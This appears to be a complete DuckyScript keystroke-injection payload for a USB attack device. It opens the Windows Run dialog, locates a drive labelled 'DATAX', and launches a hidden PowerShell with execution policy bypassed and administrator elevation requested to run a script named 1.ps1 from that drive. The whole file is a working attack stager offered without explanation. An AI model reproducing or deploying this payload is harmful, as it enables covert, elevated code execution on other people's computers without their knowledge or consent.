DELAY 500
GUI r
DELAY 200
STRING PowerShell $a=Get-Volume -FileSystemLabel 'DATAX'| Out-String; $b=$a -split('[\r\n]');$a=$b[6][0];Start-Process PowerShell -ExecutionPolicy ByPass -WindowStyle Hidden -Verb runAs "${a}:\trash\1.ps1";
ENTER
